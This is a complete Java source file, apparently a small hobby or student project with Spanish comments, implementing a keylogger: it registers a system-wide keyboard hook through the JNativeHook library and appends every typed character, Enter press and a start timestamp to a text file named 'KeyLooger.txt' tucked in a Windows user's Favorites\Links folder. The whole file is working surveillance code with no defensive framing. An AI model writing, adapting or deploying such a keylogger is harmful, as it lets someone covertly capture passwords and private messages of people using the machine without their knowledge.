/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package programakl; 
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
/**
 *
 * @author anamg
 */
public class ProgramaKL implements NativeKeyListener {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        // TODO code application logic here
        ProgramaKL kl = new ProgramaKL();
         try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            Logger.getLogger(ProgramaKL.class.getName()).log(Level.SEVERE, null, ex);
        }
         kl.InstanciarGlobalScreen();
        
    }
    public void InstanciarGlobalScreen(){
      GlobalScreen.getInstance().addNativeKeyListener(this);
      
//      Guarda la fecha en el archivo de texto
       Date date = new Date();
       DateFormat hourdateFormat = new SimpleDateFormat("HH:mm:ss dd/MM/yyyy");
       String fecha = "\n" + hourdateFormat.format(date) + "\n";
       escribirArchivo(fecha);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
//        codigo Ascci de la tecla enter, si da enter genera un salto de linea
        if (nke.getKeyCode()==10) {
             escribirArchivo("\n");
        }
 
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
//      se guardan las letras de las teclas que se precionaron
          String linea=null;
          linea= Character.toString(nke.getKeyChar());
          escribirArchivo(linea);
    }
    
      public static void escribirArchivo(String texto){
//         ruta para guardar el archivo de texto
        String ruta = "C:\\Users\\Israel\\Favorites\\Links/KeyLooger.txt"; 
        FileWriter archivo; //Abre un archivo para escritura    
        BufferedWriter linea;  //Permite escribir en el fichero
        File file = new File(ruta);
        try {//Crea un fichero de texto (el true es por si el fichero ya esta creado 
            //para que permita agregar texto en el)
            archivo= new FileWriter(file, true);
            linea = new BufferedWriter(archivo);
             
            linea.write(texto);   //escribe en el Archivo
            linea.close();      //Cierra la escritura
            archivo.close();    //Cierra el archivo
        } catch (IOException e) {
          
        }
    }
}
